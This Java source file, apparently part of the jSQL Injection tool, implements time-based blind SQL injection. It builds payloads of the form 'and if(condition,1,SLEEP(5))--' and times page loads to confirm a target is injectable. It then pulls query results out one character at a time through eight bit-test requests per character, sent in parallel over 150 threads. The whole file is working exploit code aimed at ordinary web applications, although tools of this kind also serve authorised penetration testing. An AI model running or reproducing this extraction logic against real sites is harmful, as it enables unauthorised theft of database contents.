package com.jsql.mvc.model.blind;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.mvc.model.InjectionModel;
import com.jsql.mvc.model.Interruptable;
import com.jsql.mvc.model.Stoppable;


/**
 * This module runs injection with method time based, which is defined as the following:
 *     - if SQL query is true: page loads in less than X seconds,
 *     - if SQL query is false: page loads in X seconds or more,
 * First it tests if time really works on the web server, then it processes the SQL query
 * one character at a time by using bit checking, the data to parse like SQLihhABCDEFjj31hhiLQS is always expected,
 * Each character is generated one bit at a time, so 8 requests gives 1 character, and one HTTP request gives 0 or 1
 * e.g with string 'SQLi', after 4*8 HTTP requests, 01010011=>S 01010001=>Q 01001100=>L 01101001=>i
 */
public class TimeInjection {
    // Waiting time in seconds, if response time is above then the SQL query is false
    private long timeMatch = 5;

    // Reference to the model for proxy setting, stop preparation, communication with the view, HTTP requests
    private InjectionModel injectionModel;
    
    // Time based works by default, many tests will change it to false if it isn't confirmed
    boolean isTimeInjectable = true;

    public TimeInjection(InjectionModel newModel){
        injectionModel = newModel;
        
        // Define the proxy settings
//        if(injectionModel.isProxyfied){
//            System.setProperty("http.proxyHost", injectionModel.proxyAddress);
//            System.setProperty("http.proxyPort", injectionModel.proxyPort);
//        }

        // Every FALSE SQL statements will be checked, more statements means a more robust application 
        String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};
        
        // Every TRUE SQL statements will be checked, more statements means a more robust application 
        String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};
        
        // Check if the user wants to stop the preparation
        if(injectionModel.stopFlag)return;
        
        /**
         *  Parallelize the call to the FALSE statements, it will use inject() from the model
         */
        ExecutorService executorFalseMark = Executors.newCachedThreadPool();
        List<TimeCallable> listCallableFalse = new ArrayList<TimeCallable>();
        for (String urlTest: falseTest){
            listCallableFalse.add(new TimeCallable("+and+if("+urlTest+",1,SLEEP("+timeMatch+"))--+"));
        }
        // Begin the url requests
        List<Future<TimeCallable>> listFalseMark = null;
        try {
            listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        executorFalseMark.shutdown();
        
        /**
         * If one FALSE query makes less than X seconds, then the test is a failure => exit
         * Allow the user to stop the loop  
         */
        try {
            for(Future<TimeCallable> falseMark: listFalseMark){
                if(injectionModel.stopFlag)return;
                if(((TimeCallable) falseMark.get()).isTrue()){
                    isTimeInjectable = false;
                    return;
                }
            }
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        } catch (ExecutionException e2) {
            e2.printStackTrace();
        }
        
        /**
         *  Parallelize the call to the TRUE statements, it will use inject() from the model
         */
        ExecutorService executorTrueMark = Executors.newCachedThreadPool();
        List<TimeCallable> listCallableTrue = new ArrayList<TimeCallable>();
        for (String urlTest: trueTest){
            listCallableTrue.add(new TimeCallable("+and+if("+urlTest+",1,SLEEP("+timeMatch+"))--+"));
        }
        // Begin the url requests
        List<Future<TimeCallable>> listTrueMark;
        try {
            listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
            return;
        }
        executorTrueMark.shutdown();

        /**
         * If one TRUE query makes more than X seconds, then the test is a failure => exit
         * Allow the user to stop the loop  
         */
        try {
            for(Future<TimeCallable> falseMark: listTrueMark){
                if(injectionModel.stopFlag)return;
                if(!((TimeCallable) falseMark.get()).isTrue()){
                    isTimeInjectable = false;
                    return;
                }
            }
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        } catch (ExecutionException e2) {
            e2.printStackTrace();
        }
    }
    
    /**
     * Process the whole time injection, character by character, bit by bit
     * @param inj SQL query
     * @param interruptable Action a user can stop/pause/resume
     * @param s Action a user can stop
     * @return Final string: SQLiABCDEF...
     * @throws StoppableException
     */
    public String inject(String inj, Interruptable interruptable, Stoppable s) throws StoppableException{
        // Constant linked to a URL, true if that url checks the end of the SQL result, else false
        final boolean IS_LENGTH_TEST = true;
        
        /**
         *  List of the characters, each one represented by an array of 8 bits
         *  e.g bytes[0] => 01010011:S, bytes[1] => 01010001:Q ... 
         */
        List<char[]> bytes = new ArrayList<char[]>();
        // Cursor for current character position
        int indexCharacter = 0;

        // Parallelize the URL requests
        ExecutorService taskExecutor = Executors.newFixedThreadPool(150);
        CompletionService<TimeCallable> taskCompletionService = new ExecutorCompletionService<TimeCallable>(taskExecutor);

        // Send the first binary question: is the SQL result empty?
        taskCompletionService.submit(new TimeCallable("+and+if(char_length("+inj+")>0,1,SLEEP("+timeMatch+"))--+", IS_LENGTH_TEST));
        // Increment the number of active tasks
        int submittedTasks = 1;
        
        // Process the job until there is no more active task, in other word until all HTTP requests are done
        while( submittedTasks > 0 ){
            // stop/pause/resume if user wants
            if(s.isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())){
                taskExecutor.shutdown();

                // Wait for termination
                boolean success = false;
                try {
                    success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                if (!success) {
                    // awaitTermination timed out, interrupt everyone
                    taskExecutor.shutdownNow();
                }

                throw new StoppableException();
            }
            try {
                // The URL call is done, bring back the finished task
                TimeCallable currentCallable = taskCompletionService.take().get();
                // One task has just ended, decrease active tasks by 1 
                submittedTasks--;
                /**
                 * If SQL result is not empty, then add a new unknown character,
                 * and define a new array of 8 undefined bit.
                 * Then add a new length verification, and all 8 bit requests for that new character
                 */
                if(currentCallable.isLengthTest){
                    if( currentCallable.isTrue() ){
                        indexCharacter++;
                        // New undefined bits of the next character
                        bytes.add(new char[]{'x','x','x','x','x','x','x','x'});
                        // Test if it's the end of the line
                        taskCompletionService.submit(new TimeCallable("+and+if(char_length("+inj+")>"+indexCharacter+",1,SLEEP("+timeMatch+"))--+", IS_LENGTH_TEST));
                        // Test the 8 bits for the next character, save its position and current bit for later
                        for(int bit: new int[]{1,2,4,8,16,32,64,128}){
                            taskCompletionService.submit(new TimeCallable("+and+if(ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+",1,SLEEP("+timeMatch+"))--+", indexCharacter, bit));
                        }
                        // Add all 9 new tasks
                        submittedTasks += 9;
                    }
                /**
                 * Process the url that has just checked a bit,
                 * Retrieve the bits for that character, and change the bit from undefined to 0 or 1
                 */
                }else{
                    // The bits linked to the url
                    char[] e = bytes.get(currentCallable.currentIndex-1);
                    // Define the bit
                    e[(int) (8 - ( Math.log(2)+Math.log(currentCallable.currentBit) )/Math.log(2)) ] = currentCallable.isTrue() ? '1' : '0';
                    
                    // Inform the View if a array of bits is complete, else nothing #Need fix
                    try{
                        int charCode = Integer.parseInt(new String(e), 2);
                        String str = new Character((char)charCode).toString();
                        injectionModel.new GUIThread("binary-message","\t"+new String(e)+"="+str).run();
                    }catch(NumberFormatException err){}
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            }
        }
        
        // End the job
        try {
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        // Build the complete final string from array of bits
        String result = "";
        for(char[] c: bytes){
            int charCode = Integer.parseInt(new String(c), 2);
            String str = new Character((char)charCode).toString();
            result += str;
        }    
//        System.out.println("nb caractères: "+indexChar);
//        System.out.println("résultat: "+result);
        // Return the final string
        return result;
    }
    
    /**
     * Define a call HTTP to the server, require the associated url, character position and bit.
     * diffSeconds represents the response time of the current page
     */
    private class TimeCallable implements Callable<TimeCallable>{
        // The URL called 
        private String timeUrl;
        
        // Time before the url call
        Calendar calendar1 = Calendar.getInstance();
        // Time at the end of the url call
        Calendar calendar2 = Calendar.getInstance();
        // Current page loading time
        long diffSeconds;
        
        // Character position
        private int currentIndex;
        // Bit searched
        private int currentBit;
        
        // Default call used for bit test
        private boolean isLengthTest = false;
        
        // Constructor for preparation and blind confirmation
        TimeCallable(String timeUrl){
            this.timeUrl = timeUrl;
        }
        // Constructor for bit test
        TimeCallable(String newUrl, int newIndex, int newBit){
            this(newUrl);
            currentIndex = newIndex;
            currentBit = newBit;
        }
        // Constructor for length test
        TimeCallable(String newUrl, boolean newIsLengthTest){
            this(newUrl);
            isLengthTest = newIsLengthTest;
        }
        
        /**
         * Check if a response time means the SQL query is true,
         * @return true if the current SQL test is confirmed
         */
        public boolean isTrue() {
            return diffSeconds < timeMatch;
        }

        /**
         * Process the URL HTTP call, use function inject() from the model
         * Calculate the response time of the current page 
         */
        @Override
        public TimeCallable call() throws Exception {
            calendar1.setTime(new Date());
            callUrl(timeUrl);
            calendar2.setTime(new Date());
            long milliseconds1 = calendar1.getTimeInMillis();
            long milliseconds2 = calendar2.getTimeInMillis();
            long diff = milliseconds2 - milliseconds1;
            diffSeconds = diff / 1000;
            return this;
        }
    }
    
    // Run a HTTP call via the model
    public String callUrl(String urlString){
        return injectionModel.inject(injectionModel.insertionCharacter + urlString);
    }
    
    /**
     * Start one test to verify if time works 
     * @return true if time method is confirmed
     * @throws PreparationException
     */
    public boolean isTimeInjectable() throws PreparationException{
        if(injectionModel.stopFlag)
            throw new PreparationException();
        
        TimeCallable blindTest = new TimeCallable("+and+if(0%2b1=1,1,SLEEP("+timeMatch+"))--+");
        try {
            blindTest.call();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return isTimeInjectable && blindTest.isTrue();
    }
}
